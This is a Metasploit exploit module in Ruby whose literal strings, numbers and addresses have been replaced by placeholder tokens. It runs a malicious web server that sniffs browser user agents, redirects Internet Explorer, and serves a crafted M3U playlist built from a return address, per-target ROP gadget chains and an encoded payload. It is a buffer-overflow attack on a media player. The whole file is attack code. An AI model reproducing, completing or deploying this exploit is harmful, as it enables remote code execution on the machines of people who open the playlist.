require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > { <str> = > <str> , <str> = > <str> } , <str> = > [ <str> ] , <str> = > ARCH_X86 , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > true , <str> = > <str> } , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> } ] ] ) ) end def on_request_uri ( cli , request ) return if ( ( p = regenerate_payload ( cli ) . encoded ) == nil ) host = request . headers [ <str> ] agent = request . headers [ <str> ] m3u_location = <str> host <str> get_resource ( ) <str> rand_text_alphanumeric ( <int> + rand ( <int> ) ) <str> if request . uri =~ <str> send_not_found ( cli ) elsif request . uri =~ <str> print_status ( <str> target . name <str> ) print_status ( <str> ) send_response ( cli , generate_m3u ( p ) , { <str> = > <str> } ) elsif agent =~ <str> and agent =~ <str> print_status ( <str> ) send_response ( cli , generate_redirect_ie ( m3u_location ) , { <str> = > <str> } ) elsif agent =~ <str> print_status ( <str> ) send_redirect ( cli , m3u_location ) else print_status ( <str> agent <str> ) send_not_found ( cli ) end end def generate_redirect_ie ( m3u_location ) ie_redir = <<- <str> HTML_REDIR <str> <str> HTML_REDIR ie_redir = ie_redir . gsub ( <str> , <str> ) return ie_redir end def generate_m3u ( payload ) m3u = <str> m3u << [ target . ret ] . pack ( <str> ) * <hex> m3u << [ target [ <str> ] ] . pack ( <str> ) * <int> m3u << gimme_rop m3u << payload m3u << rand_text_alphanumeric ( <hex> - m3u . length ) return m3u end def gimme_rop rop_chain = [ <str> , <hex> , <hex> , <str> , junk , <str> , <hex> , <hex> , <hex> , <str> , <str> , <str> ] rop_chain . map! { | g | case target . name when <str> case g when <str> then <hex> when <str> then <hex> when <str> then <hex> when <str> then <hex> when <str> then <hex> when <str> then <hex> else g end when <str> case g when <str> then <hex> when <str> then <hex> when <str> then <hex> when <str> then <hex> when <str> then <hex> when <str> then <hex> else g end when <str> case g when <str> then <hex> when <str> then <hex> when <str> then <hex> when <str> then <hex> when <str> then <hex> when <str> then <hex> else g end when <str> case g when <str> then <hex> when <str> then <hex> when <str> then <hex> when <str> then <hex> when <str> then <hex> when <str> then <hex> else g end end } rop_chain . pack ( <str> ) end def junk rand_text_alpha ( <int> ) . unpack ( <str> ) [ <int> ] . to_i end end 
